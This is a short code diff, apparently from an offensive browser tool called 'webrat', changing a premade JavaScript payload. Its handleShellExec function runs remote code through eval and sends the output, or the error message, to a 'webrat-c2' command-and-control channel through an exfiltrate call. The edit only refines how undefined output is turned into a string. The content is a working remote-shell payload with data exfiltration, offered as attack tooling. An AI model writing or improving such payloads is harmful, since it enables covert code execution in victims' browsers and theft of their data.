@@ -54,7 +54,8 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     function handleShellExec(code) {
         try {
             const output = eval(code);
-            exfiltrate('webrat-c2', { sub_type: 'shell-output', data: { output: String(output) }});
+            const outputString = output === undefined ? 'undefined' : String(output);
+            exfiltrate('webrat-c2', { sub_type: 'shell-output', data: { output: outputString }});
         } catch (e) {
             exfiltrate('webrat-c2', { sub_type: 'shell-output', data: { output: 'Error: ' + e.message }});
         }
